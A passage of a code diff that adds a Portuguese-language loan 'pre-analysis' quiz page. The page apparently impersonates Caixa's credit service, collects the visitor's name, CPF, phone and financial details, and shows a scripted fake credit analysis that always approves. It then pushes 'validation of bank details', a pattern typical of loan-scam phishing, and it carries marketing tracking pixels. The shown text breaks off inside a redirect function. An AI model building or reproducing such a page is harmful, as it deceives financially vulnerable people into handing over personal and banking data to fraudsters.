@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+  <meta charset="UTF-8">
+  
+  <!-- Pixel Utmify / Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "swxyif3oa6");
+  </script>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] =
+        c[a] ||
+        function () {
+          (c[a].q = c[a].q || []).push(arguments);
+        };
+      t = l.createElement(r);
+      t.async = 1;
+      t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0];
+      y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "sgok0woyb3");
+  </script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pré-Análise</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            shopee: {
+              light: "#ffdc00",
+              DEFAULT: "#1a5e9c",
+              dark: "#1a5e9c",
+              laranja: "#f7941c",
+            },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background-color: #f6f6f6;
+    }
+
+    .shopee-gradient {
+      background: linear-gradient(135deg, #FE2C55 0%, #FE2C55 100%);
+    }
+
+    .card {
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+      border-radius: 16px;
+      transition: all 0.3s ease;
+    }
+
+    .btn-shine {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-shine:after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to right,
+        rgba(255, 255, 255, 0) 0%,
+        rgba(255, 255, 255, 0.3) 50%,
+        rgba(255, 255, 255, 0) 100%
+      );
+      transform: rotate(30deg);
+      animation: shine 4s infinite;
+    }
+
+    @keyframes shine {
+      0% { left: -100%; opacity: 0; }
+      10% { left: 100%; opacity: 0.6; }
+      100% { left: 100%; opacity: 0; }
+    }
+
+    .floating {
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0px); }
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 8px;
+      background-color: #e5e7eb;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      border-radius: 4px;
+      background: linear-gradient(90deg, #f7941c 0%, #f7941c 100%);
+      transition: width 0.5s ease;
+    }
+
+    .quiz-option {
+      border: 2px solid #e5e7eb;
+      transition: all 0.3s ease;
+    }
+
+    .quiz-option:hover {
+      border-color: #ffd900;
+      background-color: rgba(255, 241, 238, 0.336);
+    }
+
+    .quiz-option.selected {
+      border-color: #f7941c;
+      background-color: #ffd90033;
+    }
+
+    .icon-circle {
+      width: 44px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+
+    .page-transition {
+      transition: opacity 0.4s ease, transform 0.4s ease;
+    }
+
+    .fade-out {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+
+    .fade-in {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* 🔥 Animação customizada pro círculo girar, independente do Tailwind */
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+
+    .custom-spin {
+      animation: spin 1s linear infinite;
+    }
+  </style>
+</head>
+
+<body class="bg-gray-50">
+  
+  <script>
+    window.pixelId = "692cedccf1d8644d9b7bb3bc";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  
+  <div id="quizPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition">
+    <!-- Header com voltar -->
+    <div class="flex items-center p-4 border-b">
+      <button id="btnVoltar" class="text-shopee text-2xl mr-3">
+        <i class="fas fa-arrow-left"></i>
+      </button>
+      <div class="flex items-center">
+        <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-10">
+        <span class="ml-2 text-xl font-bold text-shopee"></span>
+      </div>
+    </div>
+
+    <!-- Conteúdo do Quiz -->
+    <div class="flex-1 p-6 flex flex-col">
+      <!-- Progresso do Quiz -->
+      <div class="mb-6">
+        <div class="flex justify-between mb-2">
+          <span class="text-sm text-gray-600">Pré-análise de crédito</span>
+          <span id="progressText" class="text-sm font-semibold text-shopee">1/8</span>
+        </div>
+        <div class="progress-container">
+          <div id="progressBar" class="progress-bar" style="width: 20%"></div>
+        </div>
+      </div>
+
+      <!-- Container de perguntas do Quiz -->
+      <div id="quizContainer" class="flex-1">
+        <!-- Pergunta 1 -->
+        <div id="question1" class="quiz-question">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Qual o valor aproximado que você deseja solicitar?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Escolha a faixa de valor mais adequada à sua necessidade.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="500-1000" data-question="1">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">R$500 – R$1.000</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="1001-3000" data-question="1">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">R$1.001 – R$3.000</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="3001-5000" data-question="1">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">R$3.001 – R$5.000</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="acima5000" data-question="1">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Acima de R$5.000</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 2 -->
+        <div id="question2" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Possui renda fixa atualmente?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Esta informação nos ajuda a calcular o valor de crédito ideal para
+            você.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="carteira-assinada" data-question="2">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">
+                    Sim, carteira assinada
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="autonomo" data-question="2">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Sim, autônomo</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sem-renda" data-question="2">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">
+                    Não tenho renda fixa
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 3 -->
+        <div id="question3" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Seu nome está negativado atualmente?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Esta informação nos ajuda a avaliar seu perfil de crédito.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="3">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Sim</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="3">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Não</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao-sei" data-question="3">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Não sei</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 4 -->
+        <div id="question4" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Já tentou solicitar algum tipo de crédito online nos últimos 6
+            meses?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Esta informação é necessária para avaliarmos o seu perfil de
+            crédito.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="aprovado" data-question="4">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Sim, fui aprovado</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="negado" data-question="4">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Sim, fui negado</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="4">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Não</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 5 -->
+        <div id="question5" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Qual o melhor dia pra vencimento do seu empréstimo?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Escolha a data que melhor se adequa ao seu planejamento financeiro
+            mensal.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="10" data-question="5">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Dia 10</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="15" data-question="5">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Dia 15</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="20" data-question="5">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Dia 20</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="25" data-question="5">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Dia 25</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 6 -->
+        <div id="question6" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Pra qual finalidade você precisa desse crédito?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Esta informação nos ajuda a personalizar sua oferta de acordo com
+            suas necessidades.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="pagar-contas" data-question="6">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Pagar contas</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="investir-negocio" data-question="6">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">
+                    Investir no próprio negócio
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="comprar-algo" data-question="6">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">
+                    Comprar algo importante
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="uso-pessoal" data-question="6">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Uso pessoal</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 7 -->
+        <div id="question7" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Você já possui cartão de crédito ativo?
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Esta informação nos ajuda a personalizar a melhor oferta para seu
+            perfil.
+          </p>
+
+          <div class="space-y-3 mb-6">
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="7">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Sim</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="7">
+              <div class="flex items-center">
+                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                  <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                </div>
+                <div>
+                  <p class="font-medium text-gray-800">Não</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pergunta 8 (telefone) -->
+        <div id="question8" class="quiz-question hidden">
+          <h2 class="text-xl font-bold text-gray-800 mb-4">
+            Por medidas de segurança, informe seu telefone
+          </h2>
+          <p class="text-gray-600 mb-6">
+            Utilizaremos para confirmar seus dados e enviar o código de
+            acesso.
+          </p>
+
+          <div class="mb-6">
+            <label for="telefoneInput" class="block text-gray-700 font-medium mb-2">Número de Telefone:</label>
+            <input type="tel" id="telefoneInput" placeholder="(00) 00000-0000" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+            <p class="text-sm text-gray-500 mt-1">
+              Digite seu número com DDD
+            </p>
+          </div>
+
+          <button id="btnConfirmarTelefone" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white font-bold py-4 rounded-xl mb-4">
+            Confirmar telefone
+          </button>
+        </div>
+
+        <!-- Tela de análise -->
+        <div id="analysisScreen" class="quiz-question hidden">
+          <div class="text-center py-6 md:py-12">
+            <div class="relative w-32 h-32 mx-auto mb-8">
+              <div class="absolute inset-0 rounded-full border-4 border-gray-200"></div>
+              <!-- 🔥 AQUI: adicionei .custom-spin pra garantir o giro -->
+              <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-shopee custom-spin"></div>
+              <div class="absolute inset-0 flex items-center justify-center">
+                <i class="fas fa-shield-alt text-shopee text-3xl"></i>
+              </div>
+            </div>
+
+            <h2 class="text-2xl font-bold text-gray-800 mb-6">
+              Analisando seu perfil
+            </h2>
+
+            <div class="max-w-xs mx-auto bg-white rounded-xl shadow-sm p-4 mb-6">
+              <div class="flex justify-between items-center mb-4">
+                <span class="text-sm font-medium text-gray-700">Verificando score</span>
+                <span class="text-sm text-gray-400" id="statusScore"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+              </div>
+              <div class="flex justify-between items-center mb-4">
+                <span class="text-sm font-medium text-gray-700">Consultando limite</span>
+                <span class="text-sm text-gray-400" id="statusLimite"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+              </div>
+              <div class="flex justify-between items-center mb-4" id="analiseBeneficios">
+                <span class="text-sm font-medium text-gray-700">Analisando benefícios</span>
+                <span class="text-sm text-gray-400" id="statusBeneficios"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+              </div>
+              <div class="flex justify-between items-center mb-4" id="analiseRendimentos">
+                <span class="text-sm font-medium text-gray-700">Calculando rendimentos</span>
+                <span class="text-sm text-gray-400" id="statusRendimentos"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+              </div>
+              <div class="flex justify-between items-center" id="analiseAprovacao">
+                <span class="text-sm font-medium text-gray-700">Processando aprovação</span>
+                <span class="text-sm text-gray-400" id="statusAprovacao"><i class="fas fa-circle-notch fa-spin text-shopee"></i></span>
+              </div>
+            </div>
+
+            <div class="w-full max-w-xs mx-auto bg-gray-100 h-2 rounded-full overflow-hidden">
+              <div id="loadingProgressBar" class="h-full bg-shopee w-0 transition-all duration-500 ease-out"></div>
+            </div>
+
+            <p class="text-gray-500 mt-4 text-sm">
+              Isso pode levar alguns segundos...
+            </p>
+          </div>
+        </div>
+
+        <!-- Resultado -->
+        <div id="quizResult" class="quiz-question hidden">
+          <div class="text-center py-6">
+            <div class="bg-green-100 p-4 rounded-full inline-flex items-center justify-center mb-4">
+              <i class="fas fa-check-circle text-green-500 text-4xl"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">
+              Seu CPF foi pré-aprovado
+            </h2>
+            <div class="bg-shopee-light bg-opacity-10 p-4 rounded-xl my-4">
+              <div class="flex items-center">
+                <div class="text-shopee mr-3">
+                  <i class="fas fa-lock text-xl"></i>
+                </div>
+                <p class="text-left text-gray-700">
+                  Liberação imediata mediante validação de dados bancários.
+                </p>
+              </div>
+            </div>
+            <p class="text-gray-600 mb-6">
+              Parabéns! Você está a um passo de receber o seu crédito
+              Caixa. Complete a validação para liberar seu limite.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Botões de navegação -->
+      <div class="mt-auto">
+        <button id="btnNext" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine hidden">
+          Continuar
+        </button>
+
+        <button id="btnSolicitar" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl btn-shine hidden">
+          Solicitar liberação
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      // Verificar se temos os dados da API no localStorage
+      const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+      if (!dadosUsuarioJSON) {
+        console.error("Dados do usuário não encontrados no localStorage");
+        alert(
+          "Dados do usuário não encontrados. Você será redirecionado para o início."
+        );
+        window.location.href = "./index.html";
+        return;
+      }
+
+      try {
+        const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+        if (!dadosUsuario.nome || !dadosUsuario.cpf) {
+          console.error("Dados do usuário incompletos:", dadosUsuario);
+          alert("Dados incompletos. Você será redirecionado para o início.");
+          window.location.href = "./index.html";
+          return;
+        }
+        console.log(
+          "Dados do usuário válidos encontrados:",
+          dadosUsuario.nome,
+          dadosUsuario.cpf
+        );
+
+        localStorage.removeItem("nomeCompleto");
+        localStorage.removeItem("cpfUsuario");
+      } catch (error) {
+        console.error("Erro ao analisar dados do usuário:", error);
+        alert(
+          "Erro ao processar seus dados. Você será redirecionado para o início."
+        );
+        window.location.href = "./index.html";
+        return;
+      }
+
+      // Elementos do Quiz
+      const progressBar = document.getElementById("progressBar");
+      const progressText = document.getElementById("progressText");
+      const btnNext = document.getElementById("btnNext");
+      const btnSolicitar = document.getElementById("btnSolicitar");
+      const btnVoltar = document.getElementById("btnVoltar");
+      const btnConfirmarTelefone = document.getElementById(
+        "btnConfirmarTelefone"
+      );
+
+      let currentQuestion = 1;
+      const totalQuestions = 8;
+      const userAnswers = {};
+      let telefone = "";
+      let analysisStarted = false;
+
+      function updateProgress() {
+        const progress = (currentQuestion / totalQuestions) * 100;
+        progressBar.style.width = `${progress}%`;
+        progressText.textContent = `${currentQuestion}/${totalQuestions}`;
+      }
+
+      function startAnalysis() {
+        if (analysisStarted) return;
+        analysisStarted = true;
+
+        console.log("Iniciando animação de análise...");
+
+        const loadingBar = document.getElementById("loadingProgressBar");
+        if (!loadingBar) {
+          console.error("Elemento loadingProgressBar não encontrado");
+          return;
+        }
+
+        loadingBar.style.width = "0%";
+
+        setTimeout(() => {
+          document.getElementById("statusScore").innerHTML =
+            '<i class="fas fa-check-circle text-green-500"></i>';
+          loadingBar.style.width = "20%";
+
+          setTimeout(() => {
+            document.getElementById("statusLimite").innerHTML =
+              '<i class="fas fa-check-circle text-green-500"></i>';
+            loadingBar.style.width = "40%";
+
+            setTimeout(() => {
+              document.getElementById("statusBeneficios").innerHTML =
+                '<i class="fas fa-check-circle text-green-500"></i>';
+              loadingBar.style.width = "60%";
+
+              setTimeout(() => {
+                document.getElementById("statusRendimentos").innerHTML =
+                  '<i class="fas fa-check-circle text-green-500"></i>';
+                loadingBar.style.width = "80%";
+
+                setTimeout(() => {
+                  document.getElementById("statusAprovacao").innerHTML =
+                    '<i class="fas fa-check-circle text-green-500"></i>';
+                  loadingBar.style.width = "100%";
+
+                  setTimeout(() => {
+                    document
+                      .getElementById("analysisScreen")
+                      .classList.add("hidden");
+                    document
+                      .getElementById("quizResult")
+                      .classList.remove("hidden");
+                    progressText.textContent = "Concluído";
+                    btnSolicitar.classList.remove("hidden");
+                  }, 700);
+                }, 1200);
+              }, 1200);
+            }, 1200);
+          }, 1200);
+        }, 1000);
+      }
+
+      function goToNextQuestion() {
+        const currentQuestionEl = document.getElementById(
+          `question${currentQuestion}`
+        );
+        if (currentQuestionEl) {
+          currentQuestionEl.classList.add("hidden");
+        }
+
+        if (currentQuestion < totalQuestions) {
+          currentQuestion++;
+          const nextEl = document.getElementById(`question${currentQuestion}`);
+          if (nextEl) nextEl.classList.remove("hidden");
+          updateProgress();
+        } else {
+          document
+            .getElementById("analysisScreen")
+            .classList.remove("hidden");
+          progressBar.style.width = "100%";
+          progressText.textContent = "Analisando";
+
+          setTimeout(startAnalysis, 300);
+        }
+      }
+
+      document.querySelectorAll(".quiz-option").forEach((option) => {
+        option.addEventListener("click", function () {
+          const questionNumber = this.getAttribute("data-question");
+          const questionEl = document.getElementById(
+            `question${questionNumber}`
+          );
+
+          if (questionEl) {
+            questionEl.querySelectorAll(".quiz-option").forEach((opt) => {
+              opt.classList.remove("selected");
+              const indicator = opt.querySelector(".option-selected");
+              if (indicator) indicator.classList.add("hidden");
+            });
+          }
+
+          this.classList.add("selected");
+          const selectedIndicator = this.querySelector(".option-selected");
+          if (selectedIndicator) selectedIndicator.classList.remove("hidden");
+
+          const answerValue = this.getAttribute("data-value");
+          userAnswers[questionNumber] = answerValue;
+
+          setTimeout(() => {
+            goToNextQuestion();
+          }, 300);
+        });
+      });
+
+      btnConfirmarTelefone.addEventListener("click", function () {
+        const telefoneInput = document.getElementById("telefoneInput");
+        if (!telefoneInput.value) {
+          alert("Por favor, informe seu telefone para continuar.");
+          return;
+        }
+
+        telefone = telefoneInput.value;
+        goToNextQuestion();
+      });
+
+      // Botão Solicitar Liberação
+      btnSolicitar.addEventListener("click", function () {
+        console.clear();
+
+        const telefoneFormatado = telefone.replace(/\D/g, "");
+        if (!telefoneFormatado || telefoneFormatado.length < 10) {
+          alert("Por favor, informe um telefone válido.");
+          return;
+        }
+
+        const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+        if (!dadosUsuarioJSON) {
+          console.error("Dados do usuário não encontrados no localStorage");
+          alert("Dados do usuário não encontrados. Por favor, reinicie o processo.");
+          window.location.href = "./index.html";
+          return;
+        }
+
+        try {
+          const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+          console.log("Dados do usuário objeto:", dadosUsuario);
+
+          if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+            console.error("Dados de CPF ou nome não encontrados:", dadosUsuario);
+            alert("Dados incompletos. Por favor, reinicie o processo.");
+            window.location.href = "./index.html";
+            return;
+          }
+
+          dadosUsuario.nome = dadosUsuario.nome.replace(/\+/g, " ").trim();
+          const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
+          console.log("CPF (apenas números):", cpfLimpo);
+          console.log("Nome completo normalizado:", dadosUsuario.nome);
+          console.log("Telefone:", telefoneFormatado);
+
+          const mapearValorEmprestimo = {
+            "500-1000": "R$500 - R$1.000",
+            "1001-3000": "R$1.001 - R$3.000",
+            "3001-5000": "R$3.001 - R$5.000",
+            acima5000: "Acima de R$5.000",
+          };
+
+          const mapearRendaFixa = {
+            "carteira-assinada": "Sim, carteira assinada",
+            autonomo: "Sim, autônomo",
+            "sem-renda": "Não tenho renda fixa",
+          };
+
+          const mapearSolicitouCredito = {
+            aprovado: "Sim, foi aprovado",
+            negado: "Sim, foi negado",
+            nao: "Não",
+          };
+
+          const mapearFinalidadeCredito = {
+            "pagar-contas": "Pagar contas",
+            "investir-negocio": "Investir no próprio negócio",
+            "comprar-algo": "Comprar algo importante",
+            "uso-pessoal": "Uso pessoal",
+          };
+
+          const dadosParaSalvar = {
+            nome: dadosUsuario.nome,
+            cpf: cpfLimpo,
+            telefone: telefoneFormatado,
+            valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
+            renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
+            negativado:
+              userAnswers["3"] === "sim"
+                ? "Sim"
+                : userAnswers["3"] === "nao"
+                ? "Não"
+                : "Não sei",
+            solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
+            dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
+            finalidade_credito: mapearFinalidadeCredito[userAnswers["6"]] || "",
+            cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
+          };
+
+          console.log("Dados para salvar:", dadosParaSalvar);
+
+          function redirecionarSimulacao(cpfLimpo, nomeLimpo, telefoneLimpo) {
